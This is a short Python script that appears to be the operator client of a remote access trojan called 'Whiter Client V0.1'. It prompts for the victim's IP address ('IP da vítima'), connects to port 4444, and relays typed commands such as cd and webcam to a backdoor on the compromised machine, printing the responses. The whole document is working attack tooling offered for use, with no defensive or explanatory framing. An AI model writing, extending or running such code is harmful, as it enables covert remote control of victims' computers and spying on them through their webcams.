# By Dragonmodder (Jhon) - Whiter Client V0.1

import socket

print(\"\"\"
██╗    ██╗██╗  ██╗██╗████████╗███████╗██████╗     
██║    ██║██║  ██║██║╚══██╔══╝██╔════╝██╔══██╗    
██║ █╗ ██║███████║██║   ██║   █████╗  ██████╔╝    
██║███╗██║██╔══██║██║   ██║   ██╔══╝  ██╔══██╗    
╚███╔███╔╝██║  ██║██║   ██║   ███████╗██║  ██║    
 ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝    

       W H I T E R   C L I E N T   V0.1
\"\"\")

HOST = input("IP da vítima: ").strip()
PORT = 4444

cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
cliente.connect((HOST, PORT))

print('[+] Conectado. Comandos: cd, webcam, exit, etc.')

while True:
    comando = input('Whiter@client> ')
    if comando.strip() == "":
        continue
    cliente.send(comando.encode())
    if comando.lower() == 'exit':
        break
    resposta = cliente.recv(4096).decode()
    print(resposta)

cliente.close()
